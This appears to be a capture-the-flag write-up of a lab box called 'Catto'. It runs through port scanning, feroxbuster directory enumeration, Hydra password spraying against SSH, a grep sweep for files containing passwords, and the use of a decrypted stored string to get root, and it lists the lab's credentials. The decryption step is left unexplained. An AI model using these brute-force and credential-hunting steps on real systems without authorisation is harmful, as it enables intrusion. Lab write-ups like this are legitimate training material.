# Catto - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed multiple open ports:
```
PORT      STATE    SERVICE   VERSION
8080/tcp  open     http      nginx 1.14.1
18080/tcp open     http      Apache httpd 2.4.37 ((centos))
30330/tcp open     http      Node.js Express framework
42022/tcp open     ssh       OpenSSH 8.0 (protocol 2.0)
43751/tcp open     unknown
45455/tcp open     http      Node.js Express framework
50400/tcp open     http      Node.js Express framework
```

Notable findings:
- SSH running on non-standard port 42022
- Multiple web servers running on different ports
- Several Node.js Express instances

### Web Enumeration
I examined each web server to identify potential attack vectors:

1. Port 8080 (Nginx):
```bash
feroxbuster -u http://192.168.150.139:8080 -w /usr/share/wordlists/dirb/common.txt
```
- Found `/assets` and `/images` directories
- Discovered a `/download` endpoint

2. Port 18080 (Apache):
```bash
feroxbuster -u http://192.168.150.139:18080 -w /usr/share/wordlists/dirb/common.txt
```
- Found a `/backup` directory containing LaTeX templates and slides
- Discovered templates: `slides_template.tex`, `php_info.tex`, `actual_slide.tex`

3. Port 30330 (Node.js Express):
```bash
feroxbuster -u http://192.168.150.139:30330 -w /usr/share/wordlists/dirb/common.txt
```
- Found `/static` and `/icons` directories
- Discovered a Minecraft-related subdirectory

## Gaining Initial Access

### Finding Credentials
Through further enumeration of the Express server on port 30330, I discovered:
- A Minecraft configuration page at: `http://192.168.150.139:30330/new-server-config-mc`
- This revealed a potential password: `WallAskCharacter305`

I also found a list of potential usernames at: `http://192.168.150.139:30330/minecraft`
```
keralis
xisuma
zombiecleo
mumbojumbo
sabel
yvette
zahara
sybilla
marcus
tabbatha
tabby
```

### SSH Brute Force
I created a username list from the found names and used Hydra to try the discovered password:
```bash
hydra -s 42022 -L users.txt -p WallAskCharacter305 192.168.150.139 ssh
```

This revealed working credentials:
- **Username**: marcus
- **Password**: WallAskCharacter305

### Establishing SSH Access
I connected to the target using SSH on the non-standard port:
```bash
ssh marcus@192.168.150.139 -p 42022
```

## Privilege Escalation

### Credential Discovery
After gaining access as user marcus, I began searching for privilege escalation vectors:
```bash
find /home -type f -exec grep -l "password" {} \; 2>/dev/null
```

During my enumeration, I discovered a base64-encoded string:
```
F2jJDWaNin8pdk93RLzkdOTr60==
```

I attempted to decode this string by trying various methods:
```bash
echo "F2jJDWaNin8pdk93RLzkdOTr60==" | base64 -d
```

The standard base64 decoding didn't work, which suggested it might be using a custom encoding or encryption.

### Root Password Discovery
I tried using the SSH password (WallAskCharacter305) as a key for decryption and was able to obtain a string:
```
SortMentionLeast269
```

Since the system enumeration showed that root was the only other user with shell access, I tried this string as the root password:
```bash
su -
Password: SortMentionLeast269
```

This was successful, providing immediate root access to the system.

I verified full system access:
```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

This completed the challenge by successfully escalating privileges to gain full control of the target system.